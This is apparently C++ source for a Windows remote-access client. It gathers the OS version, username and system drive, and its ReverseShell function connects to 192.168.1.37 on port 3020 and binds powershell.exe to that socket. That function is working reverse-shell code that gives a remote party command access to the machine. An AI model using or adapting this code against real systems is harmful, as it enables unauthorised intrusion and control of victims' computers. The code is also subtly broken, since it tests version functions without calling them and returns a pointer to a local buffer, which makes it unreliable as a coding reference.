#include "client.h"

INT Client::versionGet() {
	/*
	Returns windows version in INT number.
	*/

	INT version = 0;

	if (IsWindowsXPOrGreater) {
		++version;
	}
	if (IsWindows7OrGreater) {
		++version;
	}
	if (IsWindows8OrGreater) {
		++version;
	}
	if (IsWindows8Point1OrGreater) {
		++version;
	}
	if (IsWindows10OrGreater) {
		++version;
	}
	return version; // 1 - WinXP; 2 - Win7; 3 - Win8; 4 - Win8.1; 5 - Win10
}

LPCWSTR Client::userGet() {
	/*
	Returns username in LPCWSTR.
	*/
	WCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	LPCWSTR user = username;
	return user;
}

LPCWSTR Client::diskGet() {
	/*
	Returns disk name in LPCWSTR.
	*/
	CONST WCHAR* letters[] = { L"A:/", L"B:/", L"C:/", L"D:/", L"E:/", L"F:/", L"G:/", L"H:/", L"I:/", L"J:/", L"K:/", L"L:/", L"M:/", L"N:/", L"O:/", L"P:/", L"Q:/", L"R:/", L"S:/", L"T:/", L"U:/", L"V:/", L"W:/", L"X:/", L"Y:/", L"Z:/" };
	for (int i = 0; i < 26; ++i) {
		if (GetDriveType(letters[i]) == 3) {
			LPCWSTR final_disk = letters[i];
			LPCWSTR system32 = L"Windows/System32/";
			WCHAR buff[256] = L"";

			wcscat(buff, final_disk);
			wcscat(buff, system32);

			DWORD dwFileAttributes = GetFileAttributes(buff);
			if (dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY || dwFileAttributes == 22) {
				return final_disk;
			}
		}
	}
}

INT Client::ReverseShell() {
	WSADATA wsaData;
	SOCKET sock;
	SOCKADDR_IN sock_addr;
	STARTUPINFOW sui;
	PROCESS_INFORMATION pi;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
		(unsigned int)NULL, (unsigned int)NULL);

	sock_addr.sin_family = AF_INET;
	sock_addr.sin_port = htons(3020);
	sock_addr.sin_addr.s_addr = inet_addr("192.168.1.37");

	cout << "Connecting to the taget...\n";

	while (true) {
		if (WSAConnect(sock, (SOCKADDR*)&sock_addr, sizeof(sock_addr), NULL, NULL, NULL, NULL) == 0) {
			cout << "Connected!\n";
			break;
		}
	}

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)sock;

	WCHAR commandLine[256] = L"powershell.exe";
	CreateProcessW(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
	return 0;
}